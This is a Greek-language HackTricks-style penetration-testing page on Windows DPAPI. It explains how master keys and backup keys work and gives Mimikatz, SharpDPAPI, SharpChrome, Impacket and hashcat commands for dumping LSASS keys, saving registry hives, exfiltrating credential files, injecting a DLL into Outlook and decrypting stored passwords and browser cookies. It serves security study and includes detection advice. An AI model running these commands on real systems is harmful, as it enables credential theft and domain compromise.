# DPAPI - Εξαγωγή κωδικών πρόσβασης

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το DPAPI

Το Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, αξιοποιώντας μυστικά χρήστη ή συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους developers, επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα logon secrets του χρήστη ή, για κρυπτογράφηση συστήματος, από τα domain authentication secrets του συστήματος, εξαλείφοντας έτσι την ανάγκη οι developers να διαχειρίζονται οι ίδιοι την προστασία του κλειδιού κρυπτογράφησης.

Ο πιο συνηθισμένος τρόπος χρήσης του DPAPI είναι μέσω των συναρτήσεων **`CryptProtectData` και `CryptUnprotectData`**, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα χρησιμοποιώντας το security context της τρέχουσας logged-on διεργασίας. Από προεπιλογή, τα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από το ίδιο user ή system context που τα κρυπτογράφησε.<sup>[[2]](#references)[[3]](#references)</sup>

Αυτές οι συναρτήσεις δέχονται επίσης μια προαιρετική **παράμετρο entropy**, η οποία χρησιμοποιείται κατά την κρυπτογράφηση και την αποκρυπτογράφηση. Τα δεδομένα που προστατεύονται με προαιρετική entropy απαιτούν την ίδια τιμή entropy για την αποκρυπτογράφηση.<sup>[[2]](#references)[[6]](#references)</sup>

### Δημιουργία κλειδιού χρηστών

Το DPAPI παράγει μια τιμή ειδική για τον χρήστη, η οποία συχνά αποκαλείται **pre-key**, από τα credentials του χρήστη. Η ακριβής παραγωγή εξαρτάται από τον λογαριασμό και την έκδοση του operating system. Για παράδειγμα, το Impacket δοκιμάζει μια διαδρομή HMAC-SHA1 που βασίζεται στο SHA-1 digest του κωδικού πρόσβασης UTF-16LE, μια άλλη που βασίζεται στο MD4/NT hash του κωδικού πρόσβασης και μια διαδρομή που προκύπτει από PBKDF2-SHA256 για Protected Users. Γι' αυτό τα offline εργαλεία μπορούν συχνά να παράγουν το απαιτούμενο υλικό είτε από τον plaintext κωδικό πρόσβασης είτε από ένα διαθέσιμο NT hash.<sup>[[2]](#references)[[10]](#references)</sup>

Αυτό είναι ιδιαίτερα ενδιαφέρον, επειδή αν ένας attacker αποκτήσει το password hash του χρήστη, μπορεί:

- **Να αποκρυπτογραφήσει οποιαδήποτε δεδομένα έχουν κρυπτογραφηθεί με DPAPI** χρησιμοποιώντας το κλειδί αυτού του χρήστη, χωρίς να χρειάζεται να επικοινωνήσει με οποιοδήποτε API
- Να προσπαθήσει να **κάνει crack στον κωδικό πρόσβασης** offline, προσπαθώντας να παράγει το έγκυρο DPAPI key

Το DPAPI διατηρεί ένα ή περισσότερα **master keys** για κάθε χρήστη, αντί να δημιουργεί ένα νέο master key για κάθε protected blob. Κάθε master key έχει ένα **GUID** (Globally Unique Identifier) και ένα encrypted blob καταγράφει ποιο master key το προστατεύει.<sup>[[2]](#references)</sup>

Τα master keys αποθηκεύονται στον κατάλογο **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, όπου το `{SID}` είναι το Security Identifier του χρήστη. Το αρχείο του master key περιέχει υλικό που προστατεύεται από το **pre-key** του χρήστη και, για domain users, υλικό ανάκτησης που προστατεύεται από ένα **domain backup key**.<sup>[[2]](#references)</sup>

Σημειώστε ότι το **domain key που χρησιμοποιείται για την κρυπτογράφηση του master key βρίσκεται στους domain controllers και δεν αλλάζει ποτέ**, επομένως αν ένας attacker έχει πρόσβαση στον domain controller, μπορεί να ανακτήσει το domain backup key και να αποκρυπτογραφήσει τα master keys όλων των χρηστών του domain.<sup>[[2]](#references)</sup>

Τα encrypted blobs περιέχουν στα headers τους το **GUID του master key** που χρησιμοποιήθηκε για την κρυπτογράφηση των δεδομένων.

> [!TIP]
> Τα DPAPI encrypted blobs ξεκινούν με **`01 00 00 00`**

Εύρεση master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Αυτό θα μοιάζει με ένα σύνολο από Master Keys ενός χρήστη:

![What is DPAPI - Users key generation: Έτσι θα μοιάζει ένα σύνολο από Master Keys ενός χρήστη](<../../images/image (1121).png>)

### Δημιουργία κλειδιού Machine/System

Αυτό το κλειδί χρησιμοποιείται από το machine για την κρυπτογράφηση δεδομένων. Βασίζεται στο **DPAPI_SYSTEM LSA secret**, το οποίο είναι ένα ειδικό κλειδί στο οποίο έχει πρόσβαση μόνο ο χρήστης SYSTEM. Αυτό το κλειδί χρησιμοποιείται για την κρυπτογράφηση δεδομένων στα οποία πρέπει να έχει πρόσβαση το ίδιο το σύστημα, όπως credentials σε επίπεδο machine ή secrets σε ολόκληρο το σύστημα.<sup>[[2]](#references)</sup>

Σημειώστε ότι αυτά τα κλειδιά **δεν διαθέτουν domain backup**, επομένως είναι προσβάσιμα μόνο τοπικά:

- Το **Mimikatz** μπορεί να αποκτήσει πρόσβαση σε αυτό κάνοντας dump των LSA secrets με την εντολή: `mimikatz lsadump::secrets`
- Το secret αποθηκεύεται μέσα στο registry, επομένως ένας administrator θα μπορούσε να **τροποποιήσει τα δικαιώματα DACL για να αποκτήσει πρόσβαση σε αυτό**. Η διαδρομή του registry είναι: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Είναι επίσης δυνατή η offline extraction από registry hives. Για παράδειγμα, ως administrator στο target, αποθηκεύστε τα hives και κάντε exfiltrate:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Στη συνέχεια, στο analysis box, ανακτήστε το DPAPI_SYSTEM LSA secret από τα hives και χρησιμοποιήστε το για να αποκρυπτογραφήσετε machine-scope blobs (κωδικούς πρόσβασης scheduled tasks, διαπιστευτήρια services, Wi‑Fi profiles κ.λπ.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Προστατευμένα δεδομένα από το DPAPI

Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI είναι τα εξής:

- Windows creds
- Οι κωδικοί πρόσβασης και τα δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
- Οι κωδικοί πρόσβασης λογαριασμών e-mail και εσωτερικών FTP για εφαρμογές όπως το Outlook και το Windows Mail
- Οι κωδικοί πρόσβασης για κοινόχρηστους φακέλους, πόρους, ασύρματα δίκτυα και το Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
- Οι κωδικοί πρόσβασης για συνδέσεις απομακρυσμένης επιφάνειας εργασίας, το .NET Passport και ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και authentication
- Οι κωδικοί πρόσβασης δικτύου που διαχειρίζεται το Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν το CryptProtectData, όπως το Skype, το MSN messenger και άλλες
- Κρυπτογραφημένα blobs μέσα στο registry
- ...

Τα δεδομένα που προστατεύονται από το σύστημα περιλαμβάνουν:
- Κωδικούς πρόσβασης Wifi
- Κωδικούς πρόσβασης scheduled tasks
- ...

### Επιλογές εξαγωγής master key

- Εάν ο χρήστης διαθέτει domain admin privileges, μπορεί να αποκτήσει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα user master keys στο domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Με τοπικά δικαιώματα διαχειριστή, είναι δυνατή η **πρόσβαση στη μνήμη του LSASS** για την εξαγωγή των DPAPI master keys όλων των συνδεδεμένων χρηστών και του κλειδιού SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Αν ο χρήστης έχει δικαιώματα **local admin**, μπορεί να αποκτήσει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Αν είναι γνωστό το password ή το NTLM hash του user, μπορείτε να **κάνετε decrypt απευθείας τα master keys του user**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Αν βρίσκεστε μέσα σε ένα session ως ο χρήστης, είναι πιθανό να ζητήσετε από το DC το **backup key για την αποκρυπτογράφηση των master keys μέσω RPC**. Αν είστε local admin και ο χρήστης είναι συνδεδεμένος, θα μπορούσατε να **κλέψετε το session token του** για αυτό:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Λίστα Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Πρόσβαση σε κρυπτογραφημένα δεδομένα DPAPI

### Εύρεση κρυπτογραφημένων δεδομένων DPAPI

Τα συνηθισμένα **προστατευμένα αρχεία** χρηστών βρίσκονται στα:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ελέγξτε επίσης αντικαθιστώντας το `\Roaming\` με `\Local\` στις παραπάνω διαδρομές.

Παραδείγματα enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να εντοπίσει DPAPI encrypted blobs στο σύστημα αρχείων, στο registry και σε B64 blobs:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Σημειώστε ότι το [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο repo) μπορεί να χρησιμοποιηθεί για την αποκρυπτογράφηση ευαίσθητων δεδομένων όπως cookies μέσω DPAPI.<sup>[[12]](#references)</sup>

#### Γρήγορες συνταγές Chromium/Edge/Electron (SharpChrome)

- Τρέχων χρήστης, interactive αποκρυπτογράφηση αποθηκευμένων logins/cookies (λειτουργεί ακόμη και με app-bound cookies του Chrome 127+ επειδή το επιπλέον κλειδί ανακτάται από το Credential Manager του χρήστη κατά την εκτέλεση σε user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline ανάλυση όταν έχετε μόνο αρχεία. Αρχικά εξαγάγετε το AES state key από το "Local State" του profile και, στη συνέχεια, χρησιμοποιήστε το για να αποκρυπτογραφήσετε τη cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage όταν έχετε το DPAPI domain backup key (PVK) και δικαιώματα admin στο target host:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Αν έχετε το DPAPI prekey/credkey ενός χρήστη (από το LSASS), μπορείτε να παραλείψετε το password cracking και να αποκρυπτογραφήσετε απευθείας τα δεδομένα του profile:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Σημειώσεις
- Οι νεότερες εκδόσεις του Chrome/Edge ενδέχεται να αποθηκεύουν ορισμένα cookies χρησιμοποιώντας κρυπτογράφηση "App-Bound". Η offline αποκρυπτογράφηση αυτών των συγκεκριμένων cookies δεν είναι δυνατή χωρίς το πρόσθετο app-bound key· εκτελέστε το SharpChrome στο context του χρήστη-στόχου, ώστε να το ανακτήσει αυτόματα. Δείτε την ανάρτηση του Chrome security blog που αναφέρεται παρακάτω.<sup>[[5]](#references)</sup>

### Κλειδιά πρόσβασης και δεδομένα

- **Χρησιμοποιήστε το SharpDPAPI** για να λάβετε credentials από αρχεία με κρυπτογράφηση DPAPI της τρέχουσας συνεδρίας:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Λάβετε πληροφορίες διαπιστευτηρίων** όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Αποκρυπτογραφήστε ένα masterkey ενός χρήστη που ζητά το **domain backup key** μέσω RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα ορίσματα για την αποκρυπτογράφηση του masterkey (σημειώστε ότι είναι δυνατή η χρήση του `/rpc` για τη λήψη του domain backup key, του `/password` για τη χρήση ενός plaintext password ή του `/pvk` για τον καθορισμό ενός αρχείου ιδιωτικού κλειδιού DPAPI domain...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Αποκρυπτογράφηση δεδομένων με χρήση masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα arguments για την αποκρυπτογράφηση των `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε ότι είναι δυνατό να χρησιμοποιήσετε το `/rpc` για να λάβετε το domains backup key, το `/password` για να χρησιμοποιήσετε έναν plaintext κωδικό πρόσβασης, το `/pvk` για να καθορίσετε ένα αρχείο private key του DPAPI domain, το `/unprotect` για να χρησιμοποιήσετε το session του τρέχοντος χρήστη...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Χρήση ενός DPAPI prekey/credkey απευθείας (δεν απαιτείται password)

Εάν μπορείτε να κάνετε dump του LSASS, το Mimikatz συχνά αποκαλύπτει ένα DPAPI key ανά logon, το οποίο μπορεί να χρησιμοποιηθεί για την αποκρυπτογράφηση των masterkeys του χρήστη χωρίς να γνωρίζετε το plaintext password. Περάστε αυτήν την τιμή απευθείας στο tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Αποκρυπτογράφηση ορισμένων δεδομένων με χρήση της **τρέχουσας συνεδρίας χρήστη**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline αποκρυπτογράφηση με το Impacket dpapi.py

Αν διαθέτετε το SID και το password του victim user (ή NT hash), μπορείτε να αποκρυπτογραφήσετε πλήρως offline τα DPAPI masterkeys και τα Credential Manager blobs χρησιμοποιώντας το dpapi.py του Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Εντοπίστε τα artefacts στον δίσκο:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Αν τα εργαλεία file transfer είναι ασταθή, μετατρέψτε τα αρχεία σε base64 στο host και αντιγράψτε το output:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Αποκρυπτογραφήστε το masterkey με το SID και το password/hash του χρήστη:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Χρησιμοποιήστε το decrypted masterkey για να αποκρυπτογραφήσετε το credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Αυτό το workflow συχνά ανακτά domain credentials που έχουν αποθηκευτεί από εφαρμογές μέσω του Windows Credential Manager, συμπεριλαμβανομένων administrative accounts (π.χ. `*_adm`).

---

### Διαχείριση προαιρετικού entropy ("Third-party entropy")

Ορισμένες εφαρμογές περνούν μια πρόσθετη τιμή **entropy** στη `CryptProtectData`. Χωρίς αυτήν την τιμή, το blob δεν μπορεί να γίνει decrypt, ακόμη και αν είναι γνωστό το σωστό masterkey. Επομένως, η απόκτηση του entropy είναι απαραίτητη όταν στοχεύετε credentials που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, ορισμένοι VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι ένα user-mode DLL που κάνει hook στις DPAPI functions μέσα στη target process και καταγράφει διαφανώς κάθε optional entropy που παρέχεται. Η εκτέλεση του EntropyCapture σε **DLL-injection** mode εναντίον processes όπως τα `outlook.exe` ή `vpnclient.exe` δημιουργεί ένα αρχείο που αντιστοιχίζει κάθε entropy buffer με την calling process και το blob. Το captured entropy μπορεί αργότερα να δοθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) για την αποκρυπτογράφηση των δεδομένων.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Η Microsoft εισήγαγε μια μορφή masterkey **context 3** ξεκινώντας από τα Windows 10 v1607 (2016). Το `hashcat` v6.2.6 (Δεκέμβριος 2023) πρόσθεσε τα hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) και **22102** (context 3), επιτρέποντας GPU-accelerated cracking των κωδικών πρόσβασης χρηστών απευθείας από το αρχείο masterkey. Οι επιτιθέμενοι μπορούν επομένως να πραγματοποιούν word-list ή brute-force attacks χωρίς να αλληλεπιδρούν με το target system.<sup>[[7]](#references)</sup>

Το `DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Το εργαλείο μπορεί επίσης να αναλύσει Credential και Vault blobs, να τα αποκρυπτογραφήσει με cracked keys και να εξαγάγει passwords σε cleartext.<sup>[[8]](#references)</sup>


### Πρόσβαση σε δεδομένα άλλου μηχανήματος

Στα **SharpDPAPI και SharpChrome** μπορείτε να καθορίσετε την επιλογή **`/server:HOST`** για πρόσβαση στα δεδομένα ενός απομακρυσμένου μηχανήματος. Φυσικά, πρέπει να μπορείτε να αποκτήσετε πρόσβαση σε αυτό το μηχάνημα και στο ακόλουθο παράδειγμα θεωρείται ότι το **domain backup encryption key είναι γνωστό**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Άλλα εργαλεία

### HEKATOMB

Το [**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα tool που αυτοματοποιεί την εξαγωγή όλων των users και computers από τον LDAP directory, καθώς και την εξαγωγή του domain controller backup key μέσω RPC. Στη συνέχεια, το script επιλύει τη διεύθυνση IP όλων των computers και εκτελεί smbclient σε όλους τους computers για να ανακτήσει όλα τα DPAPI blobs όλων των users και να τα αποκρυπτογραφήσει με το domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με τη λίστα των computers που εξήχθη από τον LDAP μπορείτε να βρείτε κάθε sub network, ακόμη και αν δεν τα γνωρίζατε!

### DonPAPI 2.x (2024-05)

Το [**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να κάνει αυτόματα dump secrets που προστατεύονται από το DPAPI. Η έκδοση 2.x εισήγαγε:<sup>[[9]](#references)</sup>

* Συλλογή blobs παράλληλα από εκατοντάδες hosts
* Parsing των **context 3** masterkeys και αυτόματη ενσωμάτωση Hashcat cracking
* Υποστήριξη για encrypted cookies του Chrome "App-Bound" (δείτε την επόμενη ενότητα)
* Ένα νέο mode **`--snapshot`** για επαναλαμβανόμενο polling των endpoints και diff των blobs που δημιουργήθηκαν πρόσφατα

### DPAPISnoop

Το [**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας C# parser για αρχεία masterkey/credential/vault, ο οποίος μπορεί να παράγει formats για Hashcat/JtR και, προαιρετικά, να εκτελεί αυτόματα cracking. Υποστηρίζει πλήρως τα machine και user masterkey formats έως και τα Windows 11 24H1.<sup>[[8]](#references)</sup>


## Συνήθεις detections

- Πρόσβαση σε αρχεία στα `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και άλλους καταλόγους που σχετίζονται με το DPAPI.
- Ιδιαίτερα από network share όπως το **C$** ή το **ADMIN$**.
- Χρήση των **Mimikatz**, **SharpDPAPI** ή παρόμοιων tooling για πρόσβαση στη μνήμη του LSASS ή για dump masterkeys.
- Event **4662**: *Εκτελέστηκε μια λειτουργία σε ένα object* – μπορεί να συσχετιστεί με πρόσβαση στο object **`BCKUPKEY`**.
- Event **4673/4674** όταν μια process ζητά το *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Ευπάθειες 2023-2025 και αλλαγές στο ecosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Νοέμβριος 2023). Ένας attacker με network access μπορούσε να εξαπατήσει ένα domain member ώστε να ανακτήσει ένα κακόβουλο DPAPI backup key, επιτρέποντας την αποκρυπτογράφηση user masterkeys. Διορθώθηκε στο cumulative update του Νοεμβρίου 2023 – οι administrators θα πρέπει να διασφαλίσουν ότι τα DCs και τα workstations είναι πλήρως patched.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Ιούλιος 2024) αντικατέστησε την παλαιότερη προστασία που βασιζόταν μόνο στο DPAPI με ένα επιπλέον key αποθηκευμένο στο **Credential Manager** του user. Η offline αποκρυπτογράφηση των cookies απαιτεί πλέον τόσο το DPAPI masterkey όσο και το **GCM-wrapped app-bound key**. Τα SharpChrome v2.3 και DonPAPI 2.x μπορούν να ανακτήσουν το επιπλέον key όταν εκτελούνται με user context.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Το Zscaler Client Connector αποθηκεύει αρκετά configuration files στο `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο είναι encrypted με **DPAPI (Machine scope)**, αλλά ο vendor παρέχει **custom entropy** που *υπολογίζεται κατά το runtime* αντί να αποθηκεύεται στον δίσκο.<sup>[[1]](#references)</sup>

Το entropy ανακατασκευάζεται από δύο στοιχεία:

1. Ένα hard-coded secret ενσωματωμένο στο `ZSACredentialProvider.dll`.
2. Το **SID** του Windows account στο οποίο ανήκει το configuration.

Ο αλγόριθμος που υλοποιείται από το DLL είναι ισοδύναμος με:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Επειδή το secret είναι ενσωματωμένο σε ένα DLL που μπορεί να διαβαστεί από τον δίσκο, **οποιοσδήποτε local attacker με δικαιώματα SYSTEM μπορεί να αναδημιουργήσει το entropy για οποιοδήποτε SID και να αποκρυπτογραφήσει τα blobs offline:**
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Η αποκρυπτογράφηση αποδίδει την πλήρη JSON configuration, συμπεριλαμβανομένων κάθε **device posture check** και της αναμενόμενης τιμής του — πληροφορίες που είναι ιδιαίτερα πολύτιμες κατά την προσπάθεια για client-side bypasses.

> TIP: τα άλλα κρυπτογραφημένα artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς** entropy (`16` μηδενικά bytes). Επομένως, μπορούν να αποκρυπτογραφηθούν απευθείας με `ProtectedData.Unprotect` μόλις αποκτηθούν δικαιώματα SYSTEM.

## References

- [1] [Synacktiv – Μπορείτε να εμπιστευτείτε το zero trust; Παράκαμψη των Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Ανάλυση ασφάλειας και ανάκτηση δεδομένων στο DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Ανάγνωση DPAPI Encrypted Secrets με Mimikatz και C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
